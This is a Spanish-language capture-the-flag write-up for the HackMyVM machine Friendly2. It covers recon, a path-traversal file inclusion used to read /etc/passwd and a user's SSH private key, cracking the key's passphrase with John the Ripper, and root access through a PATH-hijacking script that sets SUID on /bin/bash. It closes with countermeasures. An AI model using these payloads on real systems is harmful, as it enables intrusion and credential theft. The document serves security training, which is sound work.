# Máquina Friendly2 - HackMyVM

**Plataforma:** [Máquina Friendly2](https://hackmyvm.eu/machines/machine.php?vm=Friendly2)  
**Dificultad:** Fácil  
**SO:** Linux (Debian)  
**Autor del reto:** RiJaba1 
**Técnicas:** Local File Inclusion (LFI), Path Traversal, SSH Cracking (John the Ripper), Path Hijacking

---

## Índice

1. [Reconocimiento y Escaneo](#1-reconocimiento-y-escaneo)
2. [Enumeración Web y Fuzzing](#2-enumeración-web-y-fuzzing)
3. [Explotación: Local File Inclusion (LFI)](#3-explotación-local-file-inclusion-lfi)
4. [Cracking de Clave SSH](#4-cracking-de-clave-ssh)
5. [Escalada de Privilegios: Path Hijacking](#5-escalada-de-privilegios-path-hijacking)
6. [Flag de Root y Post-Explotación](#6-flag-de-root-y-post-explotación)
7. [Resumen de vulnerabilidades](#7-resumen-de-vulnerabilidades)
8. [Contramedidas recomendadas](#8-contramedidas-recomendadas)
9. [Herramientas utilizadas](#9-herramientas-utilizadas)

---

## 1. Reconocimiento y Escaneo

### Descubrimiento de Hosts

Iniciamos identificando la IP de la víctima en la red local mediante un escaneo ARP:

```bash
┌──(root㉿kali)-[~]
└─# arp-scan -I eth0 192.168.100.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:8a:35:d2, IPv4: 192.168.100.250
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1   52:54:00:12:35:00       QEMU
192.168.100.2   52:54:00:12:35:00       QEMU
192.168.100.3   08:00:27:fa:0c:f9       PCS Systemtechnik GmbH
192.168.100.9   08:00:27:0c:8f:a4       PCS Systemtechnik GmbH

27 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 3.372 seconds (75.92 hosts/sec). 4 responded
```

| Parámetro | Descripción |
|-----------|-------------|
| `-I eth0` | Interfaz de red a utilizar para el escaneo |

| IP | MAC Address | Fabricante |
| :--- | :--- | :--- |
| **192.168.100.9** | 08:00:27:0c:8f:a4 | Oracle VirtualBox |

> La IP **192.168.100.9** corresponde a la máquina objetivo Friendly2.

---

### Escaneo de Puertos y Servicios

Realizamos un escaneo exhaustivo con `nmap` para detectar servicios y versiones:

```bash
┌──(root㉿kali)-[~]
└─# nmap -p- -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.100.9
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 74:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzieRbxwfRD6zuOrOmgPocWFr6Ufu9oCqOlt/Da5dqgRIZwctsaB6P5+6aDoCtBvFAzQXZQSMmT4GmIWR7eZ/Obou3fBSMU4X8R+C/VLyx1wifxNHy5LZ0+6djQX5cl5qhBseWQX3XIqPt+4DzRILCiMZSm9J8dnC0KEe14a8vkSfgV7Zn7xGOaw9R+KldazraLdT3zlzVuvjZjItIBjnA9tBorwY2u/RgMX++HXD3uySm1qt8w+pFGI7WFd/ktfwp3RhcdKMEYmqWhjAO3L9A9arf2vDYL9y/t53XIs+FAOXzoBc2A5gxxVBe7sMsuQCSF0Jw0z5Qf11Zj9si//6WG2KfihR7rKLEIfgeGFGvnilw88HT6sZQGTew1VpfRFLgMZTPpAOwzxlqUYIRWEEvmPrW7DGqzuY+8NpJQpiOhdjhuiS0/SW6PfHVB/nsNs1pWWwo/q+HxyAAS3WjCrkd1xMf92KMs1yheQHKUGNxV/zVuTbt9puXnVhIZGzzhsE=
|   256 16:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFE+bBFz/3QsD9M4Nt6is2iJpFKhlUCSEqpUtATmeiN6jNBE245wbyIk7h3JqOxldcKyfhn7uysTo8NG4AqhPEA=
|   256 65:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxSz6doeuMiydUVbE7ZwrdP8GW46iJYY3JxJPcNuvnA
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Servicio de Mantenimiento de Ordenadores
MAC Address: 08:00:27:0C:8F:A4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

| Parámetro | Descripción |
|-----------|-------------|
| `-p-` | Escanea todos los puertos del 1 al 65535 |
| `-sS` | TCP SYN scan (stealth): no completa el handshake |
| `-sC` | Ejecuta scripts NSE por defecto |
| `-sV` | Detección de versión del servicio |
| `--min-rate 5000` | Mínimo de paquetes por segundo |
| `-vvv` | Verbosidad máxima |
| `-n` | No resuelve nombres DNS |
| `-Pn` | Omite el ping previo (asume host activo) |

> El servidor ejecuta **OpenSSH 8.4p1** en el puerto 22 y **Apache 2.4.56** en el puerto 80 (Servicio de Mantenimiento de Ordenadores).

---

## 2. Enumeración Web y Fuzzing

Utilizamos `gobuster` para descubrir directorios ocultos en el servidor web:

```bash
┌──(root㉿kali)-[/tmp]
└─# gobuster dir -u http://192.168.100.9 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x html,php -t 200
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.9
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
tools                (Status: 301) [Size: 314] [--> http://192.168.100.9/tools/]
assets               (Status: 301) [Size: 315] [--> http://192.168.100.9/assets/]
index.html           (Status: 200) [Size: 2698]
server-status        (Status: 403) [Size: 278]
Progress: 622923 / 622923 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetro | Descripción |
|-----------|-------------|
| `dir` | Modo enumeración de directorios |
| `-u` | URL objetivo |
| `-w` | Wordlist a utilizar |
| `-x html,php` | Extensiones a probar |
| `-t 200` | Número de hilos concurrentes |

| Directorio | Estado | Descripción |
| :--- | :--- | :--- |
| `/tools/` | 301 | Directorio de herramientas internas |
| `/assets/` | 301 | Recursos estáticos (imágenes, etc.) |
| `index.html`| 200 | Página principal |

Gracias al fuzzing podemos ver que existen dos directorios de interés para nosotros. Si vemos el código de `http://192.168.100.9/tools/` vemos la siguiente información. Podemos ver un comentario que será la clave de la explotación.

```html
<!DOCTYPE html>
<html>

	<head>
		<meta charset="UTF-8">
		<title>Sistema de herramientas</title>
		<style>
			h1{text-align: center;}
		</style>
	</head>

	<body>
		<h1 text-align="center"> <img src="/assets/sirena.gif"> INFORMACIÓN PRIVADA <img src="/assets/sirena.gif"> </h1>
		<div>
			<p> Toda la información de esta página está catalogada con un nivel de confidencialidad 4, esta información no deberá ser envidada ni compartida a ningún agente externo a la empresa.
		</div>

		<div>
			<h2> To do: </h2>
			<ul>
				<li> Añadir imágenes a la web principal. </li>
				<li> Añadir tema oscuro </li>
				<li> Traducir la página al inglés / translate the page into English. 😉</li>
				<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
			</ul>
		</div>
	</body>

</html>
```

---

## 3. Explotación: Local File Inclusion (LFI)

Si accedemos a `http://192.168.100.9/tools/check_if_exist.php?doc=keyboard` podemos, en lugar de escribir `keyboard` después del igual, escribir otras rutas del sistema lo que nos permitirá acceder a `/etc/passwd` y ver a los usuarios del sistema. De este modo localizamos al usuario `gh0st`. Escribimos en el navegador `http://192.168.100.9/tools/check_if_exist.php?doc=../../../../../etc/passwd` para ver la información de los usuarios. Este tipo de vulnerabilidades se conocen como **LFI** o **Local File Inclusion** ya que podemos acceder a ficheros de la máquina victima a los que no deberíamos tener acceso a través de la URL gracias a un parámetro vulnerable. El método empleado para acceder al fichero `/etc/passwd` se conoce en Hacking Web como **Path Traversal**.

> **CVE/Vulnerabilidad**: Se ha identificado una vulnerabilidad crítica de lectura arbitraria en el componente web debido a LFI en el parámetro `doc` del archivo `check_if_exist.php`.

Una vez realizado esto podemos buscar en el directorio `/home/gh0st/.ssh` el fichero `id_rsa` para poder conectarnos por SSH ya que el servicio está corriendo en el puerto 22.

Usamos `wget` para almacenar el `id_rsa` en la máquina atacante.

```bash
┌──(root㉿kali)-[/tmp]
└─# wget http://192.168.100.9/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa
--2026-04-15 05:36:50--  http://192.168.100.9/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa
Conectando con 192.168.100.9:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2655 (2,6K) [text/html]
Grabando a: «check_if_exist.php?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa»

check_if_exist.php?do 100%[=======================>]   2,59K  --.-KB/s    en 0s

2026-04-15 05:36:50 (239 MB/s) - «check_if_exist.php?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa» guardado [2655/2655]


┌──(root㉿kali)-[/tmp]
└─# ls
'check_if_exist.php?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa'
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-colord.service-tqr6Sl
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-haveged.service-TWCSpZ
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-ModemManager.service-CUx0Q6
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-pcscd.service-haAvIm
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-polkit.service-OextBk
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-systemd-logind.service-wPKhaY
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-upower.service-U9s9Xp

┌──(root㉿kali)-[/tmp]
└─# mv check_if_exist.php\?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa gh0st_id_rsa
```

En este momento intentamos conectarnos por SSH pero vemos que se nos pide la *passphrase* de la clave privada. 

```bash
┌──(root㉿kali)-[/tmp]
└─# chmod 600 gh0st_id_rsa

┌──(root㉿kali)-[/tmp]
└─# ssh -i gh0st_id_rsa gh0st@192.168.100.9
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'gh0st_id_rsa':
(gh0st@192.168.100.9) Password:
```

---

## 4. Cracking de Clave SSH

Para resolver este problema vamos a hacer uso de la suite de **John the Ripper** (JTR), centrandonos en el script `ssh2john` para obtener el *passphrase*. Asimismo, emplearemos el diccionario `rockyou.txt`.

El proceso consiste en una traducción y extracción de metadatos criptográficos: 
1. `ssh2john` decodifica la clave y localiza los parámetros del "candado", extrayendo un hash estandarizado. 
2. John the Ripper aplica fuerza bruta sobre ese hash contra el diccionario, hasta que el resultado coincida indicando la *passphrase* correcta.

```bash
┌──(root㉿kali)-[/tmp]
└─# tar -xvzf /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz && wc rockyou.txt
rockyou.txt
 14344391  14442068 139921497 rockyou.txt
```

```bash
┌──(root㉿kali)-[/tmp]
└─# ssh2john gh0st_id_rsa > hash.txt

┌──(root㉿kali)-[/tmp]
└─# john --wordlist=./rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
celtic           (id_rsa)     
1g 0:00:00:06 DONE (2026-04-15 06:52) 0.1663g/s 42.59p/s 42.59c/s 42.59C/s tiffany..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Parámetro | Descripción |
|-----------|-------------|
| `--wordlist` | Define el archivo de diccionario con las contraseñas para hacer la comprobación de fuerza bruta |

> **Nota:** Si ya hicimos anteriormente este proceso puede ocurrir que ya haya una ocurrencia de la búsqueda y nos salga que no hay hashes, pudiendo consultar entonces el resultado con la opción `--show`.

```bash
┌──(root㉿kali)-[/tmp]
└─# ssh2john gh0st_id_rsa > hash.txt

┌──(root㉿kali)-[/tmp]
└─# john --wordlist=./rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)

┌──(root㉿kali)-[/tmp]
└─# john --show hash.txt
gh0st_id_rsa:celtic

1 password hash cracked, 0 left
```

> **¡Contraseña de clave privada obtenida!** La *passphrase* de la clave SSH del usuario gh0st es `celtic`.

En este momento podemos acceder por SSH con el usuario `gh0st`.

```bash
┌──(root㉿kali)-[/tmp]
└─# ssh -i gh0st_id_rsa gh0st@192.168.100.9
...
```

> **¡Máquina comprometida!** Tenemos acceso inicial como el usuario `gh0st`.

---

## 5. Escalada de Privilegios: Path Hijacking

Primero vemos si existe algún fichero con permisos SUID extraño.

```bash
gh0st@friendly2:~$ find / -perm 4000 2>/dev/null
```

Analizamos los privilegios de `sudo` del usuario `gh0st`:

```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
```

```bash
gh0st@friendly2:~$ ls -l /opt/security.sh
-rwxr-xr-x 1 root root 561 Apr 29  2023 /opt/security.sh
```

```bash
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

El script `/opt/security.sh` utiliza comandos como `grep` y `tr` sin rutas absolutas. Además, tenemos el permiso **SETENV**, lo que permite manipular las variables de entorno alterando la variable `$PATH`.

### Explotación del Path

Como el script llama a los binarios `grep` y `tr` de forma relativa podremos usar **Path Hijacking** (secuestro de rutas). Esta técnica aprovecha una configuración insegura de la variable `$PATH` cuando se intenta ejecutar un binario de forma relativa y el atacante tiene permisos de escritura en un directorio que se cruza primero.

Colocando un archivo malicioso llamado `grep` en nuestro directorio y añadiendo dicho directorio al inicio del `$PATH` (gracias a `SETENV`), logramos que el script de root ejecute nuestro archivo creyendo que es el filtro de texto legítimo.

Procedemos a la explotación para darnos el bit SUID al bash principal.

```bash
gh0st@friendly2:~$ ls
user.txt

gh0st@friendly2:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

gh0st@friendly2:~$ echo "chmod u+s /bin/bash" > grep && cat grep
chmod u+s /bin/bash

gh0st@friendly2:~$ chmod +x grep

gh0st@friendly2:~$ ls -l
total 8
-rwxr-xr-x 1 gh0st gh0st 20 Apr 15 03:19 grep
-r--r----- 1 gh0st root  33 Apr 27  2023 user.txt

gh0st@friendly2:~$ sudo PATH=$(pwd):$PATH /opt/security.sh
Enter the string to encode:
Hackeando
The string cannot contain special characters.

gh0st@friendly2:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

gh0st@friendly2:~$ bash -p
bash-5.1# whoami
root

bash-5.1# cd /root

bash-5.1# ls
interfaces.sh  root.txt

bash-5.1# cat root.txt
Not yet! Try to find root.txt.


Hint: ...
```

> **¡Escalada completada!** Somos `root`.

---

## 6. Flag de Root y Post-Explotación

En el directorio `/root` encontramos una pista que nos redirige a un directorio oculto: `/.../`.

```bash
bash-5.1# find / -name "..." 2>/dev/null
/...
bash-5.1# cd /...
bash-5.1# ls
ebbg.txt
bash-5.1# cat ebbg.txt
It's codified, look the cipher:

CODIGO

Hint: numbers are not codified
```

El contenido está cifrado. El nombre del archivo (`ebbg`) es el resultado de aplicar **ROT13** a la palabra `root`. Aplicamos el mismo cifrado al contenido para obtener la flag final:

```bash
bash-5.1# echo "CODIGO" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
CODIGO
```

> **¡Flag de root obtenida!**

---

## 7. Resumen de vulnerabilidades

| # | Vulnerabilidad | CVE | Criticidad | Impacto |
|---|---------------|-----|------------|---------|
| 1 | Local File Inclusion (LFI) & Path Traversal | — | Alta | Permite lectura de archivos locales privados y confidenciales (p.ej., `/etc/passwd` y `.ssh/id_rsa`). |
| 2 | Clave SSH con Passphrase débil | — | Media | La clave privada estaba encriptada con una contraseña fácilmente adivinable, logrando el acceso total a la cuenta de usuario en SSH. |
| 3 | Escalada por Path Hijacking con SETENV en Sudo | — | Crítica | Permite abusar de comandos ejecutados dentro de scripts que no usan rutas absolutas, inyectando flujos que ceden control como usuario escalado (root). |

---

## 8. Contramedidas recomendadas

1. **Local File Inclusion**: Sanitizar los parámetros introductorios de la aplicación web. Nunca inyectar variables recibidas (como `doc=...`) directamente en bloques de lectura. Utilizar comprobaciones previas, listas blandas (whitelists), o procesar las variables con funciones como `basename()` impidiendo saltos de directorio.
2. **Claves SSH Inseguras**: Usar *passphrases* fuertes y complejas. Aislar la carpeta `/home` garantizando que no pueda ser transversalizable a través del LFI de ningún proceso de negocio web.
3. **Mala configuración de sudo y scripts**: Utilizar explícitamente rutas absolutas para invocar procesos dentro de cualquier script de bash sujeto a ejecución elevada (ej. `/bin/grep` en vez de `grep`). Adicionalmente, remover el atributo `SETENV` del fichero `/etc/sudoers` para un comando, con el fin de evitar que el `$PATH` local se propague e influya en los flujos del sistema escalado.

---

## 9. Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `arp-scan` | Descubrimiento de hosts y dispositivos en la red local |
| `nmap` | Escaneo y enumeración completa de puertos |
| `gobuster` | Fuzzing y enumeración de directorios de servidor web |
| `wget` | Descarga de ficheros remotos durante la extracción por LFI |
| `ssh` | Establecimiento de conexión |
| `ssh2john` | Extracción de huella (metadata condicional) para *passphrase* de id_rsa |
| `john` / `John the Ripper` | Interacción de fuerza bruta para desvelar contraseña local |
| `sudo` | Obtención de permisos privilegiados e investigación de roles |
| `find` | Inspección de variables del sistema en búsqueda de dependencias o ficheros camuflados |
| `bash -p` | Evitar la pérdida de los privilegios SUID en el salto a root |
